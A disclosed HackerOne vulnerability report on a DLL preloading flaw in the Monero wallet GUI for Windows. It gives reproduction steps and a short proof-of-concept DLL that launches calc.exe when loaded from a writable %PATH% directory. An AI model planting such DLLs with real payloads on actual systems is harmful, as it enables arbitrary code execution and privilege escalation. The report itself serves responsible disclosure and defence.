# Misconfiguration in build environment allows DLL preloading attack

## Report Details
- **Report ID**: 896338
- **URL**: https://hackerone.com/reports/896338
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-06-11T20:59:35.213Z
- **Disclosed**: 2022-01-29T17:08:01.081Z

## Reporter
- **Username**: nim4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
## Summary:
`monero-wallet-gui.exe` tries to dynamically load some dynamic link libraries(DLL) which are not present in the applications directory, so `LoadLibraryA` system-call will search other directories such as Windows root and %PATH% for them. An attacker can gain arbitrary code execution if he/she has write permission to any of the directories within the `%PATH%`.

List of DDLs:
- `ZLIB1.dll` 
- `perf.dll` loaded by `atio6axx.dll` (AMD OpenGL)

## Releases Affected:

Tried on `v0.16.0.0` on Windows 10 Home Edition with AMD GPU

## Steps To Reproduce:

  1.  Create a DLL and put the exploit in `DLL_PROCESS_ATTACH` event.
  2. Rename the DLL to `ZLIB1.dll`
  3. Copy the DLL to any directory in the path(`echo %PATH%`)
  4. Run `monero-wallet-gui.exe`

## Supporting Material/References:

PoC DLL:
```
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
    switch(fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            system("cmd /Q /D /C calc.exe");
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    
    return TRUE;
}
```

## Housekeeping

Address: 8C5XAD3aAH9CfwCh7M8vhXgzyLPCLQTPWJk6nXnxGPpH2dGfEShuWWzdXqz92tWu2874A13BEwp6SeGhWK6MAJzvKCxZW4L

## Impact

Arbitrary code execution and  privilege escalation

## Attachments
- poc.mkv
